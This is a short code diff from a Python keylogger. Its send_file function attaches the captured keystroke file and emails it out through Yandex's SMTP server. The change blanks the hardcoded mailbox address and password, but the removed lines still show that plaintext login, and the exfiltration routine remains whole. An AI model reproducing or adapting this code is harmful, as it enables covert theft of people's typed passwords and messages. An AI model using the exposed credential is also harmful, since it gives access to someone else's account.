@@ -38,8 +38,8 @@ def send_file():
     date = datetime.datetime.now()
     date_time = date.strftime('%d-%m-%Y|%H:%M:%S')
     message = MIMEMultipart()
-    message['From'] = 'klloger@yandex.ru'
-    message['To'] = 'klloger@yandex.ru'
+    message['From'] = ''
+    message['To'] = ''
     message['Subject'] = f'Keylloger {date_time}'
     file_name = 'keylloger_file.txt'
     attachment = open(file_name, 'rb')
@@ -49,8 +49,8 @@ def send_file():
     part.add_header('Content-Disposition', "attachment; filename= %s" % file_name)
     message.attach(part)
     with smtplib.SMTP_SSL('smtp.yandex.ru', 465) as server:
-        server.ehlo('klloger@yandex.ru')
-        server.login('klloger@yandex.ru', '19vic19tor86')
+        server.ehlo('')
+        server.login('', '')
         server.auth_plain()
         result = server.send_message(message)
         if result is None:
